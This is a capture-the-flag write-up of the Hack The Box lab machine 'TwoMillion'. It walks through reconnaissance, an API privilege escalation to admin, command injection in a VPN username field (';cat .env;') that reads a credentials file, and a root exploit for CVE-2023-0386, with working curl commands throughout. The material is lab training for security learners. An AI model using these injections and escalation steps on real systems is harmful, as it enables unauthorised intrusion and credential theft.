
### Port Scanning with Nmap

Before starting any attack, it is essential to perform a **reconnaissance** phase. In this case, we begin with a port scan against the **target machine** in order to identify exposed services that we may be able to leverage to gain access.

```java
nmap -p- --open -Pn -n -T5 -sSVC -vvv <IP>
````

<img src="/budahacksecurity_static/uploads/md_images/two/tw7.png" style="max-width:100%; border-radius:8px;">

We obtain **two open ports** on the target machine. When analyzing **port 80 (HTTP)**, we observe that it is associated with a **custom domain name**. To access this site correctly from our browser, we must add the domain to our `/etc/hosts` file.

To do this, we edit the file with superuser privileges:

```bash
sudo nano /etc/hosts
```



### Enumeration of Port 80 (HTTP)

When accessing the website through **port 80**, we are presented with an old version of the official **Hack The Box** website. During enumeration, we notice that clicking the **“Join”** button redirects the browser to an **invite directory**.

By reviewing the **page source code**, we find a direct reference to this directory, suggesting that it may be a useful entry point to continue exploitation or obtain an invitation.

<img src="/budahacksecurity_static/uploads/md_images/two/tw1.png" style="max-width:100%; border-radius:8px;">

<img src="/budahacksecurity_static/uploads/md_images/two/tw8.png" style="max-width:100%; border-radius:8px;">

Once inside the **`/invite`** directory, the site requests an **invitation code** to proceed. However, when inspecting the elements using the browser’s developer tools (for example, pressing F12), we notice something interesting:

When reloading the page, a JavaScript file is loaded called:

```javascript
inviteapi.min.js
```

<img src="/budahacksecurity_static/uploads/md_images/two/tw2.png" style="max-width:100%; border-radius:8px;">

---

### Deobfuscating the Code

```javascript
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    });
}
```

As a result of analyzing the deobfuscated JavaScript code, we identify two key functions:

* **`verifyInviteCode(code)`**: Verifies whether an invitation code is valid.
* **`makeInviteCode()`**: Generates a new invitation code by contacting the endpoint:

```javascript
/api/v1/invite/how/to/generate
```

Using this information, we can **directly intercept the request** made by the browser using tools such as `curl`, allowing us to obtain an invitation code **without using the web interface**.

```ruby
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate 
```

When making the API request, we receive a response that is **encoded in ROT13**, a simple substitution cipher that shifts each letter 13 positions in the alphabet.

This means that to understand the message, we must **decode it using ROT13**, which will reveal the real content and instructions.

```ruby
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

To interpret the ROT13-encoded message returned by the API, we use the online tool **CyberChef**.

Steps performed:

1. Copy the encrypted text from the `data` field.
2. Paste it into the CyberChef interface.
3. Apply the **ROT13** operation.
4. Obtain the decoded message in plain text, which provides instructions for the next step.

<img src="/budahacksecurity_static/uploads/md_images/two/tw3.png" style="max-width:100%; border-radius:8px;">

The decoded message indicates that, to generate the invitation code, we must send a **POST** request to the following endpoint:

```javascript
/api/v1/invite/generate
```

We proceed to use `curl` again to send the **POST** request to the indicated endpoint and retrieve the invitation code.

```ruby
curl -s -X POST http://2million.htb/api/v1/invite/generate
```

Upon sending the request, we receive a response containing a code **encoded in Base64**. This format is commonly used to safely transmit binary data or encoded text over ASCII-based channels.

To continue, we must **decode this Base64 string** to obtain the real invitation code.

```ruby
{"0":200,
"success":1,
"data":{"code":"NTZMOVItNjhWUk4tNlNMQ00tNFRXTVM=","format":"encoded"}}%  
```

We decode it as follows:

```ruby
echo -n "NTZMOVItNjhWUk4tNlNMQ00tNFRXTVM=" | base64 --decode
```

After decoding, we finally obtain the invitation code:

```ruby
56L9R-68VRN-6SLCM-4TWMS
```

Once we have the invitation code, we are redirected to the registration page. We use the code to complete the registration form and create an account.

After registering successfully, we gain full access to the Hack The Box platform and can continue with exploration and pentesting.

<img src="/budahacksecurity_static/uploads/md_images/two/tw4.png" style="max-width:100%; border-radius:8px;">

<img src="/budahacksecurity_static/uploads/md_images/two/tw9.png" style="max-width:100%; border-radius:8px;">

---

### 2. Exploitation

While reviewing the page source code, we once again find a route pointing to an API:

<img src="/budahacksecurity_static/uploads/md_images/two/tw5.png" style="max-width:100%; border-radius:8px;">

We proceed to send a request to the API using Burp Suite:

<img src="/budahacksecurity_static/uploads/md_images/two/tw10.png" style="max-width:100%; border-radius:8px;">

In the analyzed request, we observe several routes referencing **Admin**. This draws our attention, as they may be related to administrative functionality. We manually review each of these routes to see if any are exposed or allow access without special authentication. This may help us identify weak points or hidden functionality in the application.

```ruby
curl "http://2million.htb/api/v1/admin/settings/update" -X PUT --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json"
```

<img src="/budahacksecurity_static/uploads/md_images/two/tw11.png" style="max-width:100%; border-radius:8px;">

Once we correctly add the `Content-Type` header to the request, we see that the response returns a parameter called `email`. This indicates that the API is processing the submitted data and is likely expecting an email-related value.

We send the request again:

```ruby
curl "http://2million.htb/api/v1/admin/settings/update" -X PUT --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json" --data '{"email": "prueba@prueba.com", "admin": "1" }'
```

<img src="/budahacksecurity_static/uploads/md_images/two/tw6.png" style="max-width:100%; border-radius:8px;">

We add the `is_admin` parameter to the request:

```ruby
curl "http://2million.htb/api/v1/admin/settings/update" -X PUT --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json" --data '{"email": "buda@2million.htb", "is_admin": 1}'
```

```ruby
{"id":18,"username":"buda","is_admin":1}
```

<img src="/budahacksecurity_static/uploads/md_images/two/tw12.png" style="max-width:100%; border-radius:8px;">

Next, we inspect the route related to the VPN functionality. We confirm that a configuration file is generated. However, by modifying the `username` parameter and setting its value to `";ls;"`, we discover that it is possible to execute arbitrary commands on the server.

This confirms the presence of a **command injection vulnerability**, allowing us to interact directly with the system via the API.

```ruby
curl "http://2million.htb/api/v1/admin/vpn/generate" -X POST --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json" --data "{\"username\":\";ls;\"}"
```

![[tw13.png]]

Now that we can execute arbitrary commands on the server, we leverage this capability to inspect the `database.php` file, aiming to locate database credentials or other sensitive information that may help us progress further.

```ruby
curl "http://2million.htb/api/v1/admin/vpn/generate" -X POST --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json" --data "{\"username\":\";cat Database.php;\"}"  
```

```ruby
<?php

class Database 
{
    private $host;
    private $user;
    private $pass;
    private $dbName;

    private static $database = null;
    
    private $mysql;

    public function __construct($host, $user, $pass, $dbName)
    {
        $this->host     = $host;
        $this->user     = $user;
        $this->pass     = $pass;
        $this->dbName   = $dbName;

        self::$database = $this;
    }

    public static function getDatabase(): Database
    {
        return self::$database;
    }

    public function connect()
    {
        $this->mysql = new mysqli($this->host, $this->user, $this->pass, $this->dbName);
    }

    public function query($query, $params = [], $return = true)
    {
        $types = "";
        $finalParams = [];

        foreach ($params as $key => $value)
        {
            $types .= str_repeat($key, count($value));
            $finalParams = array_merge($finalParams, $value);
        }

        $stmt = $this->mysql->prepare($query);
        $stmt->bind_param($types, ...$finalParams);

        if (!$stmt->execute())
        {
            return false;
        }

        if (!$return)
        {
            return true;
        }

        return $stmt->get_result() ?? false;
    }
}%                       
```

Since we do not find credentials directly in the `database.php` file, we decide to list hidden files on the system. By doing so, we discover a file named `.env`.

```ruby
curl "http://2million.htb/api/v1/admin/vpn/generate" -X POST --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json" --data "{\"username\":\";ls -la;\"}"  
```

<img src="/budahacksecurity_static/uploads/md_images/two/tw14.png" style="max-width:100%; border-radius:8px;">

We open the hidden `.env` file and confirm that it contains the username and password. Using these credentials, we log in via SSH to the machine and successfully obtain the first flag.

```ruby
curl "http://2million.htb/api/v1/admin/vpn/generate" -X POST --header "Cookie: PHPSESSID=ke4qc3tgdq9rremt6jou3gi3ia;" --header "Content-Type: application/json" --data "{\"username\":\";cat .env;\"}" 
```

<img src="/budahacksecurity_static/uploads/md_images/two/tw15.png" style="max-width:100%; border-radius:8px;">

```ruby
user = admin
pass = SuperDuperPass123
```

<img src="/budahacksecurity_static/uploads/md_images/two/tw16.png" style="max-width:100%; border-radius:8px;">

After enumerating the system, we find an email from the administrator mentioning a Linux kernel vulnerability called **OverlayFS / FUSE**. We research it further and find the following exploit reference:

[https://github.com/puckiestyle/CVE-2023-0386](https://github.com/puckiestyle/CVE-2023-0386)

**The exploit is already downloaded on the machine. We proceed with the following steps:**

1. Open **two terminals** as the `admin` user.
2. In the **first terminal**, run:

```ruby
./fuse ./ovlcap/lower ./gc   
```

In the **second terminal**, run:

```ruby
./exp
```

<img src="/budahacksecurity_static/uploads/md_images/two/tw17.png" style="max-width:100%; border-radius:8px;">

If the exploit executes successfully, we obtain **root access**.

---

### Conclusion

Although the machine is classified as *easy*, it allowed me to develop and reinforce important skills, especially in **service enumeration** and the **use of tools like `curl`** to interact directly with server-side APIs. It was a very interesting and educational experience that helped improve my analytical approach and deepen my understanding of the logic behind local and remote exploitation.



